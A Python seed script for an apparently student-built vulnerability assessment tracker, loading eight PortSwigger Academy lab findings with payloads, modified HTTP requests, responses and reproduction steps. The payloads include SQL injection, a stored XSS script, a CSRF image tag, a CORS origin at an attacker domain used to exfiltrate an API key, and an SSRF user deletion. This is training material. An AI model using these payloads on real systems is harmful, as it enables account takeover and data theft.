"""
Seed Realistic PortSwigger Web Security Academy Labs & Findings for All 8 Categories
Run: python seed_demo_labs.py
"""
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app.database.database import SessionLocal
from app.models.models import Project, Student, Lab, Finding, Evidence, ActivityLog, VulnerabilityCategory
from app.database.init_db import init_db

PORT_SWIGGER_DEMO_DATA = [
    {
        "slug": "sqli",
        "category_name": "SQL Injection",
        "lab_name": "Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
        "lab_url": "https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data",
        "objective": "Perform a SQL injection attack that causes the application to display one or more unreleased products.",
        "description": "This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query such as: SELECT * FROM products WHERE category = 'Gifts' AND released = 1",
        "affected_endpoint": "/filter?category=Gifts",
        "http_method": "GET",
        "vulnerable_parameter": "category",
        "payload_used": "Gifts' OR 1=1--",
        "original_request": "GET /filter?category=Gifts HTTP/1.1\nHost: ac1f1ffd1e8.web-security-academy.net\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml\nConnection: close",
        "modified_request": "GET /filter?category=Gifts%27+OR+1%3D1-- HTTP/1.1\nHost: ac1f1ffd1e8.web-security-academy.net\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml\nConnection: close",
        "response_received": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nConnection: close\n\n<div><h3>Hidden Product: Leather jacket</h3><p>Price: $1337.00</p></div>",
        "steps_to_reproduce": "1. In browser with Burp Proxy configured, access product category filter.\n2. Intercept the GET /filter?category=Gifts request in Burp Suite.\n3. Send request to Repeater (Ctrl+R).\n4. Change parameter to: Gifts' OR 1=1--\n5. Send request and inspect response for unreleased products.\n6. Lab is solved when hidden items are displayed.",
        "impact": "An attacker can bypass authorization constraints and access hidden product data, proprietary pricing, or extract all records from the database table.",
        "recommendation": "Use parameterized queries (prepared statements) with bound parameters for all user inputs in SQL statements.",
        "severity": "High",
        "completion_percentage": 100,
        "status": "Vulnerability Confirmed",
        "finding_title": "SQL Injection via Category Filter Parameter",
        "finding_desc": "The category parameter in the /filter endpoint directly concatenates user input into an SQL query without proper parameterized querying or input validation."
    },
    {
        "slug": "xss",
        "category_name": "Cross-Site Scripting (XSS)",
        "lab_name": "Lab: Stored XSS into HTML context with nothing encoded",
        "lab_url": "https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded",
        "objective": "Submit a comment that calls the alert function when the blog post is viewed.",
        "description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality. User comments are persisted in the database and rendered in the HTML context without HTML encoding.",
        "affected_endpoint": "/post/comment",
        "http_method": "POST",
        "vulnerable_parameter": "comment",
        "payload_used": "<script>alert(document.domain)</script>",
        "original_request": "POST /post/comment HTTP/1.1\nHost: ac2f1f0e.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\n\ncsrf=xyz&postId=2&comment=Hello+World&name=Alice&email=alice%40example.com",
        "modified_request": "POST /post/comment HTTP/1.1\nHost: ac2f1f0e.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\n\ncsrf=xyz&postId=2&comment=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&name=Alice&email=alice%40example.com",
        "response_received": "HTTP/1.1 302 Found\nLocation: /post?postId=2\n\n[Redirect followed by browser, popup alert(document.domain) executed]",
        "steps_to_reproduce": "1. Open any blog post.\n2. Submit a comment containing <script>alert(document.domain)</script>.\n3. Reload the post page.\n4. JavaScript executes in the victim's session context.",
        "impact": "Attackers can hijack user sessions, steal CSRF tokens, steal authentication cookies, or perform unauthorized actions on behalf of viewing users.",
        "recommendation": "Apply contextual output encoding (HTML entity encoding) before reflecting user input in HTML body context. Implement a strict Content-Security-Policy (CSP).",
        "severity": "High",
        "completion_percentage": 100,
        "status": "Vulnerability Confirmed",
        "finding_title": "Stored Cross-Site Scripting (XSS) in Comment System",
        "finding_desc": "The comment field accepts arbitrary HTML and script tags without sanitization, leading to persistent execution for all visitors."
    },
    {
        "slug": "csrf",
        "category_name": "CSRF",
        "lab_name": "Lab: CSRF where token validation depends on request method",
        "lab_url": "https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method",
        "objective": "Craft an exploit that uses a CSRF attack to change the victim's email address using a GET request.",
        "description": "This lab contains a CSRF vulnerability in its email change function. The application validates the CSRF token when receiving POST requests, but skips token validation entirely if the method is changed to GET.",
        "affected_endpoint": "/my-account/change-email",
        "http_method": "POST",
        "vulnerable_parameter": "csrf (bypassed via GET)",
        "payload_used": "<img src=\"https://target.web-security-academy.net/my-account/change-email?email=attacker@evil.com\" />",
        "original_request": "POST /my-account/change-email HTTP/1.1\nHost: target.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nCookie: session=user_session_abc\n\nemail=new%40normal.com&csrf=validtoken",
        "modified_request": "GET /my-account/change-email?email=attacker%40evil.com HTTP/1.1\nHost: target.web-security-academy.net\nCookie: session=user_session_abc",
        "response_received": "HTTP/1.1 302 Found\nLocation: /my-account?emailChanged=true\n\n[Email address successfully updated without CSRF token]",
        "steps_to_reproduce": "1. Log into the application and change email.\n2. Intercept POST /my-account/change-email in Burp.\n3. In Repeater, right-click and select 'Change request method' to GET.\n4. Remove the CSRF token parameter.\n5. Send request and verify email changes successfully.\n6. Host exploit payload with an <img> tag pointing to the GET URL.",
        "impact": "An attacker can silently change any authenticated user's email address by tricking them into visiting a malicious site, facilitating account takeover.",
        "recommendation": "Enforce anti-CSRF token verification regardless of the HTTP method. Reject state-changing operations via GET. Use SameSite=Strict cookies.",
        "severity": "High",
        "completion_percentage": 100,
        "status": "Vulnerability Confirmed",
        "finding_title": "Cross-Site Request Forgery (CSRF) via HTTP Method Manipulation",
        "finding_desc": "CSRF token validation is bypassed by switching request method from POST to GET, allowing unauthorized state-changing actions."
    },
    {
        "slug": "cors",
        "category_name": "CORS",
        "lab_name": "Lab: CORS vulnerability with basic origin reflection",
        "lab_url": "https://portswigger.net/web-security/cors/lab-basic-origin-reflection",
        "objective": "Craft an exploit that extracts the administrator API key using CORS misconfiguration.",
        "description": "This lab has an insecure CORS configuration that trusts all origins by dynamically reflecting the request's Origin header in Access-Control-Allow-Origin, coupled with Access-Control-Allow-Credentials: true.",
        "affected_endpoint": "/accountDetails",
        "http_method": "GET",
        "vulnerable_parameter": "Origin header",
        "payload_used": "Origin: https://exploit.evil-attacker.com",
        "original_request": "GET /accountDetails HTTP/1.1\nHost: target.web-security-academy.net\nCookie: session=authenticated_user_cookie\nOrigin: https://target.web-security-academy.net",
        "modified_request": "GET /accountDetails HTTP/1.1\nHost: target.web-security-academy.net\nCookie: session=authenticated_user_cookie\nOrigin: https://exploit.evil-attacker.com",
        "response_received": "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://exploit.evil-attacker.com\nAccess-Control-Allow-Credentials: true\nContent-Type: application/json\n\n{\"username\":\"wiener\",\"apikey\":\"d41d8cd98f00b204e9800998ecf8427e\"}",
        "steps_to_reproduce": "1. Access account details in browser with Burp Suite.\n2. In Repeater, add header 'Origin: https://evil.com'.\n3. Observe that Access-Control-Allow-Origin reflects 'https://evil.com' with credentials: true.\n4. Create exploit script with XMLHttpRequest requesting /accountDetails withCredentials=true.\n5. Send exfiltrated API key to attacker server.",
        "impact": "Arbitrary external websites can read sensitive user data (API keys, personal details, tokens) from authenticated victim sessions.",
        "recommendation": "Configure a strict whitelist of trusted origins rather than dynamically reflecting the Origin header. Never specify Access-Control-Allow-Credentials: true with reflected origins.",
        "severity": "High",
        "completion_percentage": 100,
        "status": "Vulnerability Confirmed",
        "finding_title": "Arbitrary Origin Reflection with Credentials in CORS Policy",
        "finding_desc": "The application blindly reflects incoming Origin headers and returns Access-Control-Allow-Credentials: true, enabling full cross-origin data theft."
    },
    {
        "slug": "idor",
        "category_name": "IDOR / API1",
        "lab_name": "Lab: Insecure direct object references (IDOR) user chat transcripts",
        "lab_url": "https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references",
        "objective": "Find the password for the user carlos by exploiting an IDOR vulnerability on the chat transcript download endpoint.",
        "description": "This lab stores customer chat transcripts directly on the server file system and retrieves them using static sequential filenames, allowing access without authorization checks.",
        "affected_endpoint": "/download-transcript/2.txt",
        "http_method": "GET",
        "vulnerable_parameter": "transcript ID path parameter",
        "payload_used": "/download-transcript/1.txt",
        "original_request": "GET /download-transcript/2.txt HTTP/1.1\nHost: target.web-security-academy.net\nCookie: session=session_id\nConnection: close",
        "modified_request": "GET /download-transcript/1.txt HTTP/1.1\nHost: target.web-security-academy.net\nCookie: session=session_id\nConnection: close",
        "response_received": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\n[Chat Transcript #1]\nUser: carlos\nPassword reset password is: 9a8b7c6d5e4f3a2b",
        "steps_to_reproduce": "1. Start live chat and click 'View transcript'.\n2. Inspect the request in Burp Suite: GET /download-transcript/2.txt.\n3. Modify filename from 2.txt to 1.txt in Burp Repeater.\n4. Send request and observe Carlos's private chat log containing credentials.",
        "impact": "Unauthorized access to private records of other users, leading to credential theft and complete account compromise.",
        "recommendation": "Implement robust server-side object-level authorization checks. Ensure the requesting user is the legitimate owner of the transcript before streaming file contents.",
        "severity": "Critical",
        "completion_percentage": 100,
        "status": "Vulnerability Confirmed",
        "finding_title": "Broken Object Level Authorization (IDOR) on Chat Transcript Endpoint",
        "finding_desc": "Sequential integer identifiers allow unauthenticated or unauthorized users to read arbitrary chat logs containing sensitive credentials."
    },
    {
        "slug": "bopla",
        "category_name": "API3 BOPLA",
        "lab_name": "Lab: API3 Broken Object Property Level Authorization - Mass Assignment",
        "lab_url": "https://portswigger.net/web-security/api-testing/lab-bopla-mass-assignment",
        "objective": "Exploit mass assignment to modify unauthorized user profile properties and elevate privileges to administrator.",
        "description": "The user profile update API binds incoming JSON payload properties directly to backend database entities without filtering non-updatable properties such as 'role' or 'isAdmin'.",
        "affected_endpoint": "/api/v1/user/profile",
        "http_method": "PUT",
        "vulnerable_parameter": "role / isAdmin JSON property",
        "payload_used": "{\"username\": \"wiener\", \"email\": \"wiener@normal.com\", \"role\": \"administrator\", \"isAdmin\": true}",
        "original_request": "PUT /api/v1/user/profile HTTP/1.1\nHost: target.web-security-academy.net\nContent-Type: application/json\nCookie: session=user_token\n\n{\"username\": \"wiener\", \"email\": \"wiener@normal.com\"}",
        "modified_request": "PUT /api/v1/user/profile HTTP/1.1\nHost: target.web-security-academy.net\nContent-Type: application/json\nCookie: session=user_token\n\n{\"username\": \"wiener\", \"email\": \"wiener@normal.com\", \"role\": \"administrator\", \"isAdmin\": true}",
        "response_received": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"success\",\"user\":{\"username\":\"wiener\",\"role\":\"administrator\",\"isAdmin\":true}}",
        "steps_to_reproduce": "1. Analyze user profile JSON response upon login.\n2. Note object properties including 'role': 'user'.\n3. Intercept profile update request (PUT /api/v1/user/profile).\n4. Inject additional properties: \"role\": \"administrator\", \"isAdmin\": true.\n5. Send request and verify profile elevated to administrator.",
        "impact": "Privilege escalation from normal user to administrator, resulting in full control over application functionality and sensitive data.",
        "recommendation": "Use Data Transfer Objects (DTOs) with strict property schemas. Explicitly whitelist properties that clients are authorized to modify.",
        "severity": "High",
        "completion_percentage": 100,
        "status": "Vulnerability Confirmed",
        "finding_title": "Mass Assignment / BOPLA in Profile Update API",
        "finding_desc": "The API endpoint does not restrict property modification, permitting arbitrary role changes and privilege escalation."
    },
    {
        "slug": "api4",
        "category_name": "API4 Resource Consumption",
        "lab_name": "Lab: API4 Unrestricted Resource Consumption via Unbounded Query Limit",
        "lab_url": "https://portswigger.net/web-security/api-testing/lab-unrestricted-resource-consumption",
        "objective": "Identify an API endpoint lacking pagination bounds and demonstrate safe resource consumption validation within lab guidelines.",
        "description": "The product catalog API allows clients to specify arbitrary query limit values without server-side validation or upper bounding, permitting large memory allocations and CPU spikes.",
        "affected_endpoint": "/api/products?limit=100000&offset=0",
        "http_method": "GET",
        "vulnerable_parameter": "limit",
        "payload_used": "limit=1000000",
        "original_request": "GET /api/products?limit=20&offset=0 HTTP/1.1\nHost: target.web-security-academy.net\nConnection: close",
        "modified_request": "GET /api/products?limit=50000&offset=0 HTTP/1.1\nHost: target.web-security-academy.net\nConnection: close",
        "response_received": "HTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 12489020\n\n[Over 50,000 product objects streamed in a single response, server response time 8.4s]",
        "steps_to_reproduce": "1. Intercept catalog request with Burp Suite.\n2. Observe 'limit' parameter with default value of 20.\n3. In Burp Repeater, safely test increased limit (e.g., 50000) within controlled lab boundary.\n4. Observe unbounded memory dump and significant server response latency without rate limiting.",
        "impact": "Denial of service potential, resource exhaustion on database and backend memory, and bulk data extraction.",
        "recommendation": "Enforce strict server-side maximum pagination limits (e.g., max limit=50). Implement rate limiting per IP/API token using token bucket algorithms.",
        "severity": "Medium",
        "completion_percentage": 100,
        "status": "Vulnerability Confirmed",
        "finding_title": "Unbounded Pagination and Lack of Rate Limiting in Catalog API",
        "finding_desc": "Absence of upper limits on query pagination allows excessive payload generation and severe backend resource consumption."
    },
    {
        "slug": "ssrf",
        "category_name": "SSRF",
        "lab_name": "Lab: Basic SSRF against the local server",
        "lab_url": "https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost",
        "objective": "Use SSRF to access the local admin interface at http://localhost/admin and delete the user carlos.",
        "description": "This lab has a stock check feature that fetches data from an internal system. An attacker can modify the stockApi parameter to make the server request its own loopback address and access the internal admin panel.",
        "affected_endpoint": "/product/stock",
        "http_method": "POST",
        "vulnerable_parameter": "stockApi",
        "payload_used": "http://localhost/admin/delete?username=carlos",
        "original_request": "POST /product/stock HTTP/1.1\nHost: target.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nstockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1",
        "modified_request": "POST /product/stock HTTP/1.1\nHost: target.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nstockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos",
        "response_received": "HTTP/1.1 302 Found\nLocation: http://localhost/admin\n\n[Internal admin request processed; Carlos account deleted successfully]",
        "steps_to_reproduce": "1. Browse to any product page and click 'Check stock'.\n2. Intercept the POST /product/stock request in Burp Suite.\n3. Send request to Burp Repeater.\n4. Change stockApi parameter to: http://localhost/admin/delete?username=carlos\n5. Send request and inspect response (302 redirect).\n6. Verify the lab confirmation showing user Carlos was deleted.",
        "impact": "Attacker forces backend server to perform requests against localhost and internal network resources, bypassing network firewalls and access controls.",
        "recommendation": "Implement strict allowlists for destination URLs. Disable HTTP redirection on server-side HTTP clients. Segment internal management interfaces onto separate network zones.",
        "severity": "High",
        "completion_percentage": 100,
        "status": "Vulnerability Confirmed",
        "finding_title": "Server-Side Request Forgery (SSRF) against Localhost Interface",
        "finding_desc": "The stock check feature permits arbitrary destination URLs, allowing callers to manipulate backend requests against internal administration portals."
    }
]


def seed_demo_data():
    init_db()
    db = SessionLocal()
    try:
        # Find or create project
        project = db.query(Project).filter_by(name="WebVAPT – PortSwigger Web Security Academy Minor Project").first()
        if not project:
            project = Project(
                name="WebVAPT – PortSwigger Web Security Academy Minor Project",
                description="Comprehensive Web Vulnerability Assessment and Penetration Testing Minor Project covering eight major categories with practical Burp Suite evidence.",
                start_date="2026-10-15",
                submission_date="2026-11-15",
            )
            db.add(project)
            db.commit()
            db.refresh(project)
            print(f"[+] Created main project: {project.name}")

        # Student info
        student = db.query(Student).filter_by(project_id=project.id).first()
        if not student:
            student = Student(
                project_id=project.id,
                student_name="Vikas Vicky",
                usn="1XX21CS101",
                college="School of Computer Science & Engineering",
                department="Computer Science & Engineering (Cybersecurity)",
                batch="2021-2025 (Batch A)",
                team_members="Vikas Vicky (Lead Investigator)\nTeam Member 2 (Burp Analyst)",
                project_guide="Dr. Cyber Security, Associate Professor",
            )
            db.add(student)
            db.commit()
            print(f"[+] Added student profile: {student.student_name}")

        # Seed categories & labs
        for item in PORT_SWIGGER_DEMO_DATA:
            cat = db.query(VulnerabilityCategory).filter_by(slug=item["slug"]).first()
            category_id = cat.id if cat else None

            # Check if lab already exists
            existing_lab = db.query(Lab).filter(
                Lab.project_id == project.id,
                Lab.category_slug == item["slug"],
                Lab.lab_name == item["lab_name"]
            ).first()

            if not existing_lab:
                lab = Lab(
                    project_id=project.id,
                    category_id=category_id,
                    category_slug=item["slug"],
                    lab_name=item["lab_name"],
                    lab_url=item["lab_url"],
                    objective=item["objective"],
                    description=item["description"],
                    affected_endpoint=item["affected_endpoint"],
                    http_method=item["http_method"],
                    vulnerable_parameter=item["vulnerable_parameter"],
                    payload_used=item["payload_used"],
                    original_request=item["original_request"],
                    modified_request=item["modified_request"],
                    response_received=item["response_received"],
                    steps_to_reproduce=item["steps_to_reproduce"],
                    impact=item["impact"],
                    recommendation=item["recommendation"],
                    severity=item["severity"],
                    status=item["status"],
                    completion_percentage=item["completion_percentage"],
                )
                db.add(lab)
                db.commit()
                db.refresh(lab)
                print(f"[+] Created Lab [{item['slug'].upper()}]: {lab.lab_name[:50]}...")

                # Add sample finding
                finding = Finding(
                    lab_id=lab.id,
                    finding_id=f"{item['slug'].upper()}-001",
                    title=item["finding_title"],
                    vulnerability_category=item["category_name"],
                    category_slug=item["slug"],
                    owasp_classification=f"OWASP {cat.owasp_ref if cat else ''}",
                    lab_name=lab.lab_name,
                    objective=lab.objective,
                    description=item["finding_desc"],
                    affected_endpoint=lab.affected_endpoint,
                    affected_parameter=lab.vulnerable_parameter,
                    http_method=lab.http_method,
                    payload_used=lab.payload_used,
                    steps_to_reproduce=lab.steps_to_reproduce,
                    impact=lab.impact,
                    recommendation=lab.recommendation,
                    severity=lab.severity,
                    severity_justification=f"Confirmed through reproducible practical exploitation in PortSwigger Academy lab.",
                    discovery_date="2026-10-25",
                    testing_status="Vulnerability Confirmed",
                    remediation_status="Open",
                    burp_request_screenshot="burp_request_capture.png",
                    burp_response_screenshot="burp_response_capture.png",
                    proof_screenshot="proof_of_exploit.png",
                )
                db.add(finding)

                # Add activity log
                log = ActivityLog(
                    project_id=project.id,
                    action="Assessed Lab",
                    entity_type="lab",
                    entity_id=lab.id,
                    description=f"Completed {item['category_name']} assessment: {lab.lab_name[:40]}...",
                )
                db.add(log)
                db.commit()
            else:
                print(f"[*] Lab already exists: [{item['slug'].upper()}]")

        db.commit()
        print("\n[SUCCESS] Seed demo data loaded successfully!")
    finally:
        db.close()


if __name__ == "__main__":
    seed_demo_data()

